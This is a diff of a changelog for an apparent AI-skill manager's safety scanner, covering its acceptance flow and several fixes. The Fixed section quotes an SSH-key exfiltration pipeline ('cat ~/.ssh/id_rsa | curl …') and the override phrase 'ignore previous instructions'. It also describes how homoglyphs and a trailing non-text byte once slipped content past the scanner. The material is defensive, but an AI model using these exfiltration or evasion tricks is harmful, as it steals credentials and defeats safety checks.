@@ -19,10 +19,13 @@ changes carry a **Breaking** call-out with their migration note inline.
   instead of all in the front door, would it read the same on another
   tool. Only safety can hold anything back; quality is there to inform.
   Every finding names the file and line, says what it found in plain
-  words, and comes with the fix. Examples inside code blocks are read too
-  — the model reads them either way — but they count for less than a live
-  instruction, except for credentials, which count the same wherever they
-  are. A leaked key is never repeated anywhere: you get a fingerprint,
+  words, and comes with the fix. A command inside a code block in the file
+  a tool actually loads counts in full — that is where skills put their
+  commands, and the model reads them either way. What counts for less is
+  writing that is plainly quoting rather than telling: a blockquote, and
+  the test fixtures and reference pages a skill ships alongside it.
+  Credentials count the same wherever they are. A leaked key is never
+  repeated anywhere: you get a fingerprint,
   enough to tell two leaks apart and useless to anyone who sees it. Text
   carrying hidden characters, or letters chosen to look like other
   letters, is reported as such — content that needs decoding to look
@@ -74,13 +77,16 @@ changes carry a **Breaking** call-out with their migration note inline.
   in the preview with what was found and why, and nothing about it is
   written. Migration: the two thresholds are yours to set in app
   settings, and nothing else changes for content that passes. If you have
-  read the findings and want it anyway, `vstack apply --allow-unsafe
-  <name>` installs it and records the review in your `vstack.toml` — but
-  that record is bound to the exact content, the exact rules, and the
-  exact problems you were shown. Change any of them and it stops
-  applying and the item is held back again. The record lives with the
-  project rather than in a global list precisely so it cannot quietly
-  become a permanent exemption.
+  read the findings and want it anyway, the preview prints the exact
+  command that installs it — `vstack apply --allow-unsafe <name>@<code>`,
+  where the code stands for the content you were just shown — and records
+  the review in your `vstack.toml`. The name on its own does nothing, so a
+  line left in a script or a shell history cannot wave through content
+  nobody has read. The record is bound to the exact content, the exact
+  rules, and the exact problems you were shown; change any of them and it
+  stops applying, the item is held back again, and the preview prints the
+  new code. The record lives with the project rather than in a global list
+  precisely so it cannot quietly become a permanent exemption.
 - **Breaking:** `vstack refresh` no longer changes what is installed
   without asking. Regenerating what is already installed stays
   automatic; anything being added or removed (including dependencies a
@@ -266,6 +272,46 @@ changes carry a **Breaking** call-out with their migration note inline.
 
 ### Fixed
 
+- The safety check no longer flags ordinary code for reading its own
+  settings. `process.env.API_URL`, `os.environ[...]`, `import.meta.env`
+  and `Deno.env` are how every JavaScript and Python program reads the
+  values you gave it, and every one of those lines was being reported as
+  reading a credential file — enough of them to hold back any catalog
+  with a single JavaScript skill in it. Naming a project's own `.env` in
+  a README or opening it in a loader script says nothing either, so it no
+  longer says anything. Reading a real key store and sending it somewhere
+  — `cat ~/.ssh/id_rsa | curl …` — is still the most serious thing the
+  check reports. Sweeping a 39-item catalog now returns twelve findings
+  where it used to return two hundred and ninety-six.
+- A command shown inside a code block in a SKILL.md is now treated as
+  what it is: the instruction. It used to count for less, which meant the
+  check held back the awkward way of writing an attack and let through
+  the way anybody would actually write one. Test fixtures and reference
+  pages that a skill ships alongside itself still count for less, because
+  a test asserting on a dangerous command line is describing it, not
+  issuing it.
+- A single byte that is not text can no longer hide a whole file. Adding
+  one to the end of a script used to make it invisible to every rule, and
+  the item then scored a perfect hundred on content nobody had read. Such
+  a file is now read as far as it can be, and the part that could not be
+  read is reported so the score is not mistaken for a clean bill.
+- The check now recognises far more letters that are drawn to look like
+  English ones. It knew about Cyrillic and Greek capitals; a Greek `υ`, an
+  Armenian `ո` or a small-capital `ᴜ` dropped into "ignore previous
+  instructions" went through with nothing reported at all.
+- Warnings about an MCP server's command line no longer quote the command
+  back with an API key still in it. Any value the check repeats to you now
+  goes through the same redaction as a key it found on purpose.
+- The Audit page tells the truth about items you have accepted. An
+  installed item whose findings you read and accepted was being shown as
+  "held back" — the opposite of what was true — and an acceptance that no
+  longer matched what is on disk was never shown as stale.
+- Things the check could not look at now say so instead of disappearing.
+  A plugin that is not installed yet, and an MCP server whose entry could
+  not be read, used to score a silent hundred out of a hundred and then be
+  dropped from the report entirely, so a row nobody had audited read as
+  one that passed. MCP servers are now read out of the config file that
+  holds them, so most of them are genuinely checked.
 - Removing something while its catalog is unavailable now sticks. If the
   catalog was offline, moved, or not downloaded yet, the removal went
   through and then the next refresh quietly put the item back — silently,
